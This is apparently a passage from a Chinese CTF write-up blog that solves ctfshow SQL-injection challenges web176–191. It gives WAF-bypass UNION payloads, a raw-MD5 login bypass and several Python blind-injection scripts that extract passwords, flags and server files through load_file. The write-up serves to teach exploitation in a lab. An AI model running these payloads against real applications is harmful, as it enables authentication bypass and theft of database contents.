<p>不知道过滤了啥</p>
<p>这里之前的不可以,但是大小写可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;uNion seleCt 1,groUp_concAt(username,password),3 frOm ctfshow_user%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407130913425.png" alt="image-20220407130913425"></p>
<h1 id="web177-179"><a href="#web177-179" class="headerlink" title="web177-179"></a>web177-179</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407131027613.png" alt="image-20220407131027613"></p>
<h2 id="空格的代替"><a href="#空格的代替" class="headerlink" title="空格的代替"></a>空格的代替</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%09or%091%23	TAB水平</span><br><span class="line">-1&#x27;%0aor%0a1%23	新建一行</span><br><span class="line">-1&#x27;%0cor%0c1%23	新建一页</span><br><span class="line">-1&#x27;%0dor%0d1%23	return功能</span><br><span class="line">-1&#x27;%0bor%0b1%23	TAB(垂直)</span><br><span class="line">%a0 			空格 这里不行</span><br></pre></td></tr></table></figure>

<p>注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,group_concat(username,password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure>

<p>括号</p>
<p>我也不会,自己研究怎么加括号吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union(select(1),(group_concat(username,password)),(3)from(ctfshow_user))%23</span><br></pre></td></tr></table></figure>

<p>反引号</p>
<p>我不懂但是可以实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select`id`,`username`,`password`from`ctfshow_user`%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407131136762.png" alt="image-20220407131136762"></p>
<h1 id="web180-183"><a href="#web180-183" class="headerlink" title="web180-183"></a>web180-183</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407135553899.png" alt="image-20220407135553899"></p>
<h2 id="过滤注释符与空格"><a href="#过滤注释符与空格" class="headerlink" title="过滤注释符与空格"></a>过滤注释符与空格</h2><p>联合注入好像无法实现,反正我不会,如果没过滤其他空格可以实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union%0cselect(1),(group_concat(username,password)),(3)from(ctfshow_user)where(1)and&#x27;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407140553761.png" alt="image-20220407140553761"></p>
<h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407141724604.png" alt="image-20220407141724604"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">  </span><br><span class="line">  //对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br></pre></td></tr></table></figure>

<h2 id="regexp匹配like通配pwd"><a href="#regexp匹配like通配pwd" class="headerlink" title="regexp匹配like通配pwd"></a>regexp匹配like通配pwd</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_pwd</span>(<span class="params">url</span>):</span><br><span class="line">    dic=<span class="string">r&#x27;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&#x27;</span></span><br><span class="line">    ans =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span>  dic:</span><br><span class="line">            <span class="comment">#flag=&quot;ctfshow&#123;&quot;</span></span><br><span class="line">            <span class="comment">#payload = f&quot;(ctfshow_user)where(pass)like&#x27;&#123;flag+j&#125;%&#x27;</span></span><br><span class="line">            payload =<span class="string">f&quot;(ctfshow_user)where(substr(pass,<span class="subst">&#123;i&#125;</span>,1))regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;tableName&#x27;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                ans += j</span><br><span class="line">                <span class="built_in">print</span>(ans)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a4c677e5-0ca4-46f8-85da-961e108b532b.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">post_pwd(url)</span><br></pre></td></tr></table></figure>

<h1 id="web184-1"><a href="#web184-1" class="headerlink" title="web184"></a>web184</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">str_to_hex</span>(s):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([<span class="title function_ invoke__">hex</span>(<span class="title function_ invoke__">ord</span>(c)).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c in s])</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j in <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line"><span class="comment">#&#x27;tableName&#x27;:&quot;ctfshow_user a inner join ctfshow_user b on b.pass like &#123;&#125;&quot;.format(&quot;0x&quot;+str_to_hex(flag+j+&quot;%&quot;))</span></span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:f<span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#x27;0x&#x27;+str_to_hex(flag+j+&#x27;%&#x27;)&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;<span class="subst">$user_count</span> = 1&quot;</span> in r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>HAVING语句通常与GROUP BY语句联合使用，用来过滤由GROUP BY语句返回的记录集。<br> HAVING语句的存在弥补了WHERE关键字不能与聚合函数联合使用的不足。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span>  j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RIGHT JOIN等同于RIGHT OUTER JOIN，右外连接，不满足ON条件的会保留右边那张表的数据，左边表数据直接显示NULL</p>
<h1 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h1><p>数字的表示哦</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407150732592.png" alt="image-20220407150732592"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bdd55ead-f197-4ec4-b304-8bf0dd687c8d.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;createNum(i)&#125;</span>,<span class="subst">&#123;createNum(<span class="number">1</span>)&#125;</span>)regexp(char(<span class="subst">&#123;createNum(j)&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407153242084.png" alt="image-20220407153242084"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407153406158.png" alt="image-20220407153406158"></p>
<h2 id="pwd的md5"><a href="#pwd的md5" class="headerlink" title="pwd的md5"></a>pwd的md5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(string,raw)     </span><br><span class="line">参数	描述</span><br><span class="line">string	必需。要计算的字符串。</span><br><span class="line">raw	</span><br><span class="line">可选。</span><br><span class="line">    默认不写为FALSE。32位16进制的字符串</span><br><span class="line">    TRUE。16位原始二进制格式的字符串</span><br></pre></td></tr></table></figure>

<p> 这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。</p>
<p>上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。</p>
<p> 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    ‘    ‘字符。6f就是对应‘    o    ’。</p>
<pre><code>   然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&#39;or&#39;6�]��!r,��b&#39;

   为什么password = &#39;&#39;or&#39;6�]��!r,��b&#39;的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然不能以0开头。（我不知道在数据库里面查询的时候，�这种会不会显示）

   这里引用一篇文章，连接在下面，里面的原话“a string starting with a 1 is cast as an integer when used as a boolean.“

  在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。

   当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

 所以到这里为止，就完成了sql注入。同时要注意的是，这种sql语句，在mysql里面是可以行得通的，但是在oracle数据库里面这样的语句是有语法错误的。

   所以回过头来为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符。那么进一步思考这个单引号是否是必要的，这两个单引号是为了与原有的语句的单引号配对。所以我们理解了这个sql注入的原理，那么就明白了我们需要怎样的字符串。
</code></pre>
<h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407153535740.png" alt="image-20220407153535740"></p>
<p>这条语句可以查出所有数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users where username = 1&lt;1 and password = 0</span><br><span class="line">SELECT * FROM users where username = 0 and password = 0</span><br></pre></td></tr></table></figure>

<p>在where username&#x3D;0这样的查询中,因为username都是字符串,在mysql中字符串与数字进行比较适合,以字母开头的字符串都会转换成数字0,因此这个where可以把所有以字母开头的数据查出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br></pre></td></tr></table></figure>

<p>这里的查询密码是弱类型,查出来的passwd也是以字母开头的,所以password&#x3D;0可以成功弱类型比较</p>
<p>这样也可以查到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from referers where referer = &#x27;http://127.0.0.1/sqlilabs/Less-19/&#x27; and referer = 1;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407154415679.png" alt="image-20220407154415679"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT password FROM users where username = 1||1 and password = 12;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407154509937.png" alt="image-20220407154509937"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&lt;1&amp;password=0</span><br><span class="line">username=0&amp;password=0</span><br><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure>

<h1 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407155009165.png" alt="image-20220407155009165"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407155019582.png" alt="image-20220407155019582"></p>
<h2 id="load-file-函数盲注文件"><a href="#load-file-函数盲注文件" class="headerlink" title="load_file()函数盲注文件"></a>load_file()函数盲注文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://356200d4-1b3a-4eff-818f-9c21ccbf8214.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        payload=<span class="string">&quot;if((load_file(&#x27;/var/www/html/api/index.php&#x27;))regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3d54cb5b-69e8-4592-85b3-662e3aa01ea5.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlagIndex</span>():</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">300</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;flag&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;0&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(mid)),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">num</span>):</span><br><span class="line">    i = <span class="built_in">int</span>(num)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),</span><br><span class="line">                                                                                                               <span class="built_in">str</span>(</span><br><span class="line">                                                                                                                   mid)),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    index = getFlagIndex()</span><br><span class="line">    getFlag(index)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><h2 id="无过滤盲注"><a href="#无过滤盲注" class="headerlink" title="无过滤盲注"></a>无过滤盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://87a2c8d4-69ca-4617-b96c-ce3601bdc1a6.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库 ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 id,f1ag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span>  == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><h2 id="ord函数盲注"><a href="#ord函数盲注" class="headerlink" title="ord函数盲注"></a>ord函数盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://646c4493-3a66-407e-8ddf-c59355418a23.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库 ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段 f1ag</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ord(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span>  == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆破出来可能是大写的</p>
<p>主要还是一个地方，就是一般布尔注入都会用改成ascii码值进行比较，正常字符串的比较不也是挨个位置比较ascii码吗？为什么还要多费事的去加一层ascii，这个的原因就是mysql进行字符串比较的时候，是按大写比较的，比如”1ab2AAD”，比较的时候是”1AB2AAD”，所以才会加上那一层ascii，这题ascii被ban了，直接字符串比较的话肯定爆出来的都是大写了。</p>
